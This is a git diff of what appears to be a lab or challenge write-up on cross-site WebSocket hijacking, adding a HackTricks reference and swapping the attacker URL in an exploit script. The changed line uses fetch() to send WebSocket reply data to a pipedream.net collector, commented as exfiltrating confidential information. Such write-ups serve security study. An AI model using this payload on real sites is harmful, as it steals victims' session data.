@@ -2,7 +2,7 @@
 title: XSS Vulnerabilities
 Summary: Unprotected Websocket challenge
 date: "2025-03-23"
-
+#https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/cross-site-websocket-hijacking-cswsh.md#simple-attack
 ---
 
 ![Websocket_1](websockets.svg)
@@ -82,7 +82,7 @@ function start(event) {
 }
 function handleReply(event) {
   //Exfiltrate the confidential information to attackers server
-  fetch('https://eoj1ovww5kfcgvi.m.pipedream.net/?'+event.data, {mode: 'no-cors'})
+  fetch('https://eor5pi7epfnejaq.m.pipedream.net/?'+event.data, {mode: 'no-cors'})
 }
 </script>
 
